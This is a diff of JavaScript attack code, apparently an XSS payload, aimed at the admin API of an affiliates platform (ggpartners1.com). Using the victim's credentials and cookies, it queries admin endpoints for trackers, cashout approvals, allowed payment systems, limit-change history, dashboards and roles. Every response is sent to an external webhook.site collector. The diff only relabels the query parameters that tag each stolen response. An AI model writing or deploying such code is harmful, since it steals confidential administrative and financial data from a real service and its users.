@@ -145,14 +145,14 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/trackers/list', {
 .then(response => {
   if (!response.ok) {
     var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ab="+response.status, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?trackers="+response.status, false ); // false for synchronous request
     xmlHttp.send( null );
       throw new Error(`HTTP error! status: ${response.status}`);
     }
   a = response.json(); // Parse the JSON response from the server
  const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?ab="+jsonString, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?trackers="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
@@ -318,7 +318,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?allowed_payment_systems="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -336,7 +336,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?allowed_payment_systems="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -355,7 +355,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?history_of_limit_changes="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -374,7 +374,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
       xhr.withCredentials = true;
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?history_of_limit_changes="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send( null );
       };
       xhr.onerror = function () {
@@ -393,7 +393,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?dashboard="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -412,7 +412,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?dashboard="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -432,7 +432,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?dashboardc="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -451,7 +451,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?dashboardc="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -472,7 +472,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?dashboardt="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -491,7 +491,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?dashboardt="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"_merchant":getCookie("merchant_id")});
       };
       xhr.onerror = function () {
@@ -510,7 +510,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?roles="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"namespace":"admin"});
       };
       xhr.onerror = function () {
@@ -529,7 +529,7 @@ fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/appr
      xhr.setRequestHeader("Content-Type","application/json");
       xhr.onload = function(e) {
         var xmlHttp1 = new XMLHttpRequest();
-        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?apit="+xmlHttp.responseText, false ); // false for synchronous request
+        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?roles="+xmlHttp.responseText, false ); // false for synchronous request
         xmlHttp1.send({"namespace":"admin"});
       };
       xhr.onerror = function () {
